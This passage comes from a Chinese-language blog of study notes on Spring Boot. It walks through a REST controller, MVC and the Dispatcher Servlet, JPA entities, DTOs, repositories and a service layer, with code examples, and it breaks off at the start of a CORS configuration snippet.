格式数据处理的时候，可以采用这种格式来测试。</li></ul><blockquote><p>这部分概念太多了，有些概念用到再说。</p></blockquote><h1 id="Chapter-1-Introduction-to-Spring-Boot"><a href="#Chapter-1-Introduction-to-Spring-Boot" class="headerlink" title="Chapter 1. Introduction to Spring Boot"></a>Chapter 1. Introduction to Spring Boot</h1><h2 id="1-1-First-Spring-Boot-Project-A-RESTful-Web-Service"><a href="#1-1-First-Spring-Boot-Project-A-RESTful-Web-Service" class="headerlink" title="1.1 First Spring Boot Project: A RESTful Web Service"></a>1.1 First Spring Boot Project: A RESTful Web Service</h2><p>在进入枯燥的概念和接口学习前，先用简单的方法构建一个简单的 RESTful Web Service 出来。</p><p>首先使用 gradle 构建管理工具创建一个项目，引入依赖：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id <span class="string">&#x27;java&#x27;</span></span><br><span class="line">    id <span class="string">&#x27;org.springframework.boot&#x27;</span> version <span class="string">&#x27;3.2.4&#x27;</span></span><br><span class="line">    id <span class="string">&#x27;io.spring.dependency-management&#x27;</span> version <span class="string">&#x27;1.1.4&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 包位置 priv.demo */</span></span><br><span class="line">group = <span class="string">&#x27;priv.demo&#x27;</span></span><br><span class="line">version = <span class="string">&#x27;0.0.1-SNAPSHOT&#x27;</span></span><br><span class="line"></span><br><span class="line">java &#123;                                                                                   sourceCompatibility = <span class="string">&#x27;21&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">repositories &#123;                                                                           mavenCentral()</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;                                                                           implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-web&#x27;</span></span><br><span class="line">   testImplementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-test&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">tasks.named(<span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    useJUnitPlatform()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个 Java 记录类型作为存放数据的结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Greeting</span><span class="params">(<span class="type">long</span> id, String content)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>创建一个资源控制器（相当于 Servlet 的处理逻辑）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicLong;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">template</span> <span class="operator">=</span> <span class="string">&quot;Hello, %s!&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicLong</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/greeting&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Greeting <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;, defaultValue = &quot;World&quot;)</span> String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Greeting</span>(counter.incrementAndGet(), String.format(template, name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释一下 <code>@GetMapping(&lt;path&gt;)</code>：保证所以筛选到 <code>&lt;path&gt;</code> 路径的 GET 请求被框架统一转发给被修饰的方法（这里是 <code>greeting</code>）。</p><p>其中，如果要处理 HTTP 尾缀参数，那么被 <code>@GetMapping</code> 修饰的方法强烈建议使用 <code>@RequestParam(&lt;value&gt;, &lt;defaultValue&gt;)</code> 修饰参数，这样能清楚地知道处理参数的情况。</p><p>例如上面的例子中，Servlet 能识别 <code>GET /greeting</code> 的请求，并且调用后端程序的 <code>greeting</code> 方法。返回的 record 对象会被框架自动解析并以 JSON 形式响应客户端（浏览器）。</p><p>由于方法中写了 <code>@RequestParam</code>，因此可以接受任何 <code>/greeting?name=&lt;...&gt;</code> 的后缀参数信息。</p><blockquote><p>除了这里的 <code>@GetMapping</code>，还有 <code>@PostMapping</code>（对应 POST 请求）等等。</p><p>此外，<code>@RequestMapping(method=GET)</code> 等价于 <code>@GetMapping</code>，相当于是其他各种 Mapping 的综合体。</p></blockquote><p>另外，我们使用了 <code>AtomicLong</code> 类型，保证多线程情况下的安全性。<code>counter</code> 为当前运行时请求编号；</p><p>最后，还需要说明，这个类只有使用 <code>@RestController</code> 注解才能发挥作用。</p><p>它的作用是标识这个类作为一个 RESTful API 的资源接收和控制器，并且<u>其中的每个方法都会返回 domain object，而不是一个 view（视图，传统 MVC Controller 都会返回视图）</u>。这个注解等价于 <code>@Controller</code> 和 <code>@ResponseBody</code>（表示这里生成的是 HTTP 响应体）联合使用。</p><p>实际上，使用 <code>@RestController</code> 修饰的类中每个方法返回的 domain object 应该被转为 JSON（就是这里的 Greeting 对象应该转为 JSON）。但是因为有一个库 <code>Jackson 2</code> 的存在，Spring 会自动选择 <code>MappingJackson2HttpMessageConverter</code> 来将 record 实例转为 JSON。</p><p>最后，我们创建一个 <code>main</code> 函数来启动服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestServiceApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(RestServiceApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到，<code>@SpringBootApplication</code> 相当于以下 3 个注解的结合：</p><ul><li><p><code>@Configuration</code>：将被修饰的类标记为当前 Application 上下文的 Bean 的定义方；</p><blockquote><p>回忆 DI（依赖注入），这里相当于产生 Bean（之前的 Record 类型）的类型。</p></blockquote></li><li><p><code>@EnableAutoConfiguration</code>: 告诉 Spring Boot 根据当前 classpath 中的设置来开始注入 beans，以及其他属性设置。例如，如果 <code>spring-webmvc</code> 在 classpath 中，那么这个注解的含义就是将这个类标记为 Web Application，并且激活一些重要的行为，例如设置启动 <code>DispatcherSevlet</code>；</p></li><li><p><code>@ComponentScan</code>：告诉 Sping 来查找其他的在 <code>priv/demo</code> 中的组件、设置和服务包，并且找到 Controller；</p></li></ul><h2 id="1-2-What-is-MVC"><a href="#1-2-What-is-MVC" class="headerlink" title="1.2 What is MVC?"></a>1.2 What is MVC?</h2><p>MVC 是一种软件设计架构模式，大多数时候应用在 Web Application 中，主要分为 3 层：</p><ul><li>Control Layer：软件控制层。如果用在 Web App 上，这层的职责是<u><strong>解析</strong>从 Web Server 传来的对特定 URL 的请求，并转发给服务程序的相应逻辑块</u>；</li><li>Model Layer：软件模型层。实际上的职责是<u>软件的数据表示</u>（就是对关系型数据库中存储的数据以及表单进行面向对象的表述），能让你轻松地从数据库中取出数据后放入对象中，并且轻松地展示在 Web 页面上；</li><li>View Layer：软件视图层。在传统的 Web 应用架构中，前端的程序主导了这个任务（比如 React、Anngular）。但是在 MVC 架构中，这部分位于后端，并且它的职责是<u>收到从数据库传来的数据，并将其组织在 Web 页面上</u>。</li></ul><h2 id="1-3-What-is-Dispatcher-Servlet"><a href="#1-3-What-is-Dispatcher-Servlet" class="headerlink" title="1.3 What is Dispatcher Servlet?"></a>1.3 What is Dispatcher Servlet?</h2><p>在 Spring MVC 中，有些东西不解释清楚就没法开始。比如一个 Spring MVC 中的概念 Dispatcher Servlet。</p><p>我们知道，Servlet 就是一种 Web Server 和 Web App 间的接口。在 Web App 软件层面只要按照 Servlet 接口实现一个 Servlet 就能与 Web Server 直接交互。</p><p>所谓的 Dispatcher Servlet 是一种编码模式（code pattern），也是 Servlet 的一种实现方式，在 MVC 架构中，作为 Control Layer 的一部分。</p><p>它在概念上主要完成了一件重要的事情：<strong>Request Handling &amp; Mapping</strong>。</p><p>Dispatcher Servlet 实现了 Servlet 接口，能给接收从 Web Server 传来的 HTTP 请求。当一个请求到达 Spring MVC Application 时，它会首先到达 Control Layer 的 Dispatcher Servlet。</p><p>Dispatcher Servlet 会根据 Spring Framework 对于请求的配置（底层配置在 <code>web.xml</code> 中，但 Spring MVC 已经包装在了像 <code>@ReuqestMapping</code> 一类的注解中了），映射（map）到相应的 Controller 中（通常被包装为一个方法）进行处理。</p><p>此后，收到 Dispatcher Servlet 请求的 controller 中会对传入的数据进行详细处理，例如处理请求参数、访问数据库、准备响应体等等。</p><p>再然后，Controller 会将处理好的数据交给指定的 view 进行组装。这里的 View Layer 会生成像 JSP / Thymeleaf templates / JSON 之类的数据结构，并且发送。</p><blockquote><p>Dispatcher Servlet 的这种职责实际上也是采用了一种编码模式，叫做 Front Controller。</p></blockquote><h2 id="1-4-What-does-Models-actually-do"><a href="#1-4-What-does-Models-actually-do" class="headerlink" title="1.4 What does Models actually do?"></a>1.4 What does Models actually do?</h2><p>在 Spring MVC 中，显然一个 Model 作为软件的数据表示，是一个至关重要的部分。但同时也是 Spring MVC 包装较好的部分、较简单的部分。</p><p>一个 Model 通常可以是一个 “POJO”（Plain Old Java Class / Object）；</p><blockquote><p>什么是 POJO？</p><p>Plain Old Java Object 特指那些 <strong>不用 extends / implements 其他外部框架的、不使用外部框架的 annotation 的 Java 类型</strong>。</p><p>简言之，你能不依赖框架写出的手写 Java 类型的实例都是 POJO。例如 Java Bean 就是典型的 POJO（允许 extends Java 原生接口，例如 <code>Serializable</code>）。</p><p>使用 POJO 的优势是，POJO 能够更加贴近、关注业务逻辑，不依赖外部框架代码（与外部框架解耦），不需要考虑外部代码对它的隐式影响。</p></blockquote><p>不过 Model 所包含的功能不止于用 POJO 保存信息，它还要完成一个重要的职责：<u>将 POJO 与关系型数据库表建立关联</u>（这个过程由 Spring JPA 模块完成）。</p><p>那么，接下来如何让 Spring Framework 知道这个 POJO 对应的类型是个 Model，并且如何将 POJO 由 JPA 映射为关系型数据库的表记录呢？</p><p>一般需要做 3 件事：</p><ol><li><p>确定描述 Model 的 POJO 类型。这件事就在告诉 Spring，这个类是个表示数据的类（即 Model），等会 JPA 可以按照这个类型创建关系型数据库的表单；</p><blockquote><p>这件事既可以由 <code>XML</code> 配置来做，也可以由 Spring Boot 包装好的注解 <code>@Entity</code> 来做。</p><p>但是如果加了注解，原来的类就不再是 POJO 类型。所以为了便捷性，需要在规范上作出一些取舍。</p></blockquote></li><li><p>确定 Model 中的哪个数据域为 POJO 的唯一识别符。这个表示建议 JPA 在创建数据库表时，将这个数据类型作为表的 <u>主键</u>；</p><blockquote><p>同样，这件事既可以由 <code>XML</code> 配置来做，也可以由 Spring Boot 包装好的注解 <code>@Id</code> 来做。</p></blockquote></li><li><p>决定 Model 中的哪些数据域是需要框架 / 驱动来生成的，而不是用户（Requests）传入的。这个告诉 JPA，这个数据域外部不会给定，应该由程序根据情况生成。</p><blockquote><p>举个例子，你可能在第二条中，想要为每个同类型的 POJO 维护一个全局唯一的 id，但这个 id 肯定不能由用户指定，通常是数据库的自增键来自动生成。</p><p>在 Spring Boot 中，提供了 <code>@GeneratedValue</code> 注解，相当于告诉 JPA，这个数据域应该生成而不是传入得到（通常是通过数据库当前的信息判断出来）。默认行为是在 JPA 生成数据库表时，将被修饰的数据域生成成为 “auto increment”（这种数据域被称为 database indentity）；</p></blockquote></li></ol><p>举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.persistence.*;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.annotations.CreationTimestamp;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.annotations.UpdateTimestamp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span>   <span class="comment">/* Equivalent to @Getter @Setter @RequiredArgsConstructor @ToString @EqualsAndHashCode.  */</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Builder</span>    <span class="comment">/* Generate ClassBuilder static class */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;posts&quot;)</span>  <span class="comment">/* Tell JPA to generate data into named table &#x27;books&#x27;. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostInfo</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">/* Equivalent to: UNIQUE + NOT NULL + IMMUTABLE */</span></span><br><span class="line">    <span class="comment">/* It relies on an auto-incremented database column</span></span><br><span class="line"><span class="comment">     * and lets the database generate a new value with each insert operation.</span></span><br><span class="line"><span class="comment">     * But, this prevents it from using different optimization techniques like JDBC batching. */</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long postId;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CreationTimestamp</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createdOn;</span><br><span class="line">    <span class="meta">@UpdateTimestamp</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime updatedOn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5-N-Tier-Architecture"><a href="#1-5-N-Tier-Architecture" class="headerlink" title="1.5 N-Tier Architecture"></a>1.5 N-Tier Architecture</h2><blockquote><p>前置知识：什么是 DTO？</p><p>在 MVC 架构中，有一种对象称数据转移对象（Data Transfer Object）。它的作用是在 Application 的不同层级 / 子系统间传输数据。</p><p>DTO 尤其常用在 N-Tiers 中使用，其好处是减少数据在各部分传输的量，使得程序信息能清晰地相互传输。具体的应用场景如下：</p><ul><li>假设数据库中原本抽象出的对象有很多属性，但是我在某些层级间传输时，只需要用到一部分。那么就没有必要把对象整体传来传去：我们可以定义一个 DTO 类型，属性是原类型的子集，使得功能清晰、传参无负担；</li><li>假设有个方法需要传入 4 个以上参数，那么写方法签名、手动传参就不现实。可以定义一个 DTO 类型来向其传参，语义更清晰；</li></ul><p>所以，DTO 就是一种普通的类型，提取了某个类型的一些属性。</p><p>例如，上一节定义的 <code>PostInfo</code> 中，有一些数据现在不需要在 App 中传输，那么可以这么定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostDto</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long postId;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>在软件工程中有个非常有趣的事实是，90% 的时候都无需使用软件工程的设计原理（software engineering design patterns），但是应用在底层的架构设计是恰恰又需要用到。</p><p>有一种软件设计架构叫 N-Tier（或者说 N-Tier Repository Pattern，Multi-Tier Architecture），也是接下来我们想要实践的架构。它是一种 C/S 架构设计模式，最广泛的使用方法是将其分为 3 个部分：</p><ul><li><p>Data Tier（Repository）：以 Web 开发为例，通常在 Java 后端服务中，此层是管理数据库的部分（在 Java 中通常封装为一个类型）。它通常具有 CRUD 四种方法，并且充当了在数据库表结果 和 对象之间转换的桥梁；</p><blockquote><p>在 Spring JPA 中提供了一个接口 <code>JpaRepository&lt;EntityType, EntityIdType&gt;</code> 轻松定义 custom query method（这样我们可通过方法名判断出对应的 SQL 语句）。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> priv.demo.models.PostInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PostRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;PostInfo, Long&gt; &#123;</span><br><span class="line"> Optional&lt;PostInfo&gt; <span class="title function_">findByPostId</span><span class="params">(Long postId)</span>;</span><br><span class="line"> List&lt;PostInfo&gt; <span class="title function_">findByTitle</span><span class="params">(String title)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，<code>PostRepository</code> 又称 DAO（Data Access Object）类型。DAO 和 DTO 一样，也是一种编码模式（code pattern），它的作用是使用一组 API 将 application tier / bussiness logic 与 persistence layer 隔离开，达到模块解耦的作用。</p></blockquote></li><li><p>Application Tier（Bussiness Logic）：以 Web 开发为例，通常在 Java 后端服务中，此层是通常是 Spring 框架中处理数据的业务逻辑部分；</p><blockquote><p>在使用 Spring MVC 时，除了我们直接写 Controllers 外，还建议抽象出一层 “Service”（服务层），这样可以把处理特定的数据库操作与业务逻辑解耦（即可以表示处理特定业务逻辑所需的操作），这样项目功能改变时就不用担心大幅度改代码，只需要到实现功能的 service 中改动就行，不会有 ”这块代码是干什么“ 的担忧。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo.services;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> priv.demo.dto.PostDto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PostService</span> &#123;</span><br><span class="line"> <span class="comment">/* Use predefined DTO in services */</span></span><br><span class="line"> List&lt;PostDto&gt; <span class="title function_">findAllPosts</span><span class="params">()</span>;</span><br><span class="line"> Optional&lt;PostDto&gt; <span class="title function_">findPostsById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们再实现这个接口，注意因为服务抽象肯定需要 repository 的数据库操作，因此需要与 <code>JpaRepository</code> 组合。这个时候就用到了 Spring 的依赖注入的特性，让模块解耦：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo.services.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> priv.demo.dto.PostDto;</span><br><span class="line"><span class="keyword">import</span> priv.demo.models.Post;</span><br><span class="line"><span class="keyword">import</span> priv.demo.repositories.PostRepository;</span><br><span class="line"><span class="keyword">import</span> priv.demo.services.PostService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span>    <span class="comment">/* provide Spring with PostSerivce Bean */</span></span><br><span class="line">            <span class="comment">/* (可以在写 Controller 时再回来添加)  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">PostService</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Use Jpa Repository to achieve goals */</span></span><br><span class="line"> PostRepository postRepository;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Use Spring Dependency Injection: inject repo to de-couple dependencies. */</span></span><br><span class="line"> <span class="comment">/* Also, we need to provide repository from other area.</span></span><br><span class="line"><span class="comment">     * Here we provide Spring with repo in  */</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PostServiceImpl</span><span class="params">(PostRepository repository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.postRepository = repository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;PostDto&gt; <span class="title function_">findAllBooks</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;PostInfo&gt; posts = postRepository.findAll();</span><br><span class="line">        <span class="keyword">return</span> posts.stream().map((post -&gt; mapToPostDto(post))).collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Optional&lt;PostDto&gt; <span class="title function_">findPostsById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        Optional&lt;Post&gt; src = postRepository.findByPostId(id);</span><br><span class="line">        <span class="keyword">return</span> (src.map(PostServiceImpl::mapToPostDto));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@implNote</span> Private self-defined mapper.</span></span><br><span class="line"><span class="comment">     *  Covert model (database representation) to DTO (app representation).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> PostDto <span class="title function_">mapToPostDto</span><span class="params">(PostInfo post)</span> &#123;</span><br><span class="line">        <span class="type">PostDto</span> <span class="variable">postDto</span> <span class="operator">=</span> postDto.builder()</span><br><span class="line">                .postId(post.getPostId())</span><br><span class="line">                .title(post.getTitle())</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> postDto;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，以上从 <code>PostInfo</code>（数据库表示，即 model）向 <code>PostDto</code>（应用程序传输表示，即 DTO）转换时，需要自定义 <code>mapToPostDto</code> 的方法。</p><p>此外，在数组元素处理时，我们还使用了 Java 中类似 JavaScript 的处理方法 <code>map</code>，对数组每个元素的处理方法就变简单了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;T&gt;.stream().map(&lt;mapFunc&gt;);    <span class="comment">/* 返回映射后的 Stream 对象 */</span></span><br><span class="line">Stream.collect(Collectors.toList());    <span class="comment">/* 将产生的 Stream 对象转换回 List&lt;T&gt; */</span></span><br></pre></td></tr></table></figure><p>再聊聊 Controllers 的部分。后面的数据布置都已清晰，剩下来还要布置 Controller 处理 Web Server 发来的请求。</p><p>除了在在 1.1 中见到的 <code>@RestController</code> 可以创建普通的 REST Controller 以外，还有普通的 Controller <code>@Controller</code>（少了将 Controller 方法组织成资源返回值的方法）；</p><p>此外，<code>@RequestMapping()</code> 可以使用、<code>@GetMapping/@PostMapping/@DeleteMapping/...</code> 注解也可以使用。</p></blockquote></li><li><p>Presentation Tier（Frontend）：以 Web 开发为例，通常在前端服务中，此层就是渲染 Web Page 页面的部分，可以由 React 等框架解决。</p></li></ul><h2 id="1-6-CRUD-Read-Data"><a href="#1-6-CRUD-Read-Data" class="headerlink" title="1.6 CRUD: Read Data"></a>1.6 CRUD: Read Data</h2><p>以上的所有知识已经足够我们将前端、后端连接起来。当然，后端如果要处理数据，还得把接下来几节学完。</p><p>现在让我们一起巩固所学，将前端和后端连接起来，先了解 “前端读取后端数据” 的效果如何达成。</p><p>首先，我们由上面的示例，已经能利用 JPA 从数据库中获取数据，并且呈现 JSON 结果了。因此我们只需要修改事先写好的前端，加入 <code>fetch</code> API，读取从后端传来的数据，再呈现在页面上即可。只要你完全了解了上面的理论，那么 read data 就是简单地在前端加上 <code>fetch</code> 获取资源，仅此而已。</p><p>值得注意的是，如果你做的项目也是前后端分离的（服务在不同端口上），那么 CORS 将会是一大问题。请自行查阅资料解决，笔者贴上自己的解决方案（Spring Boot）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 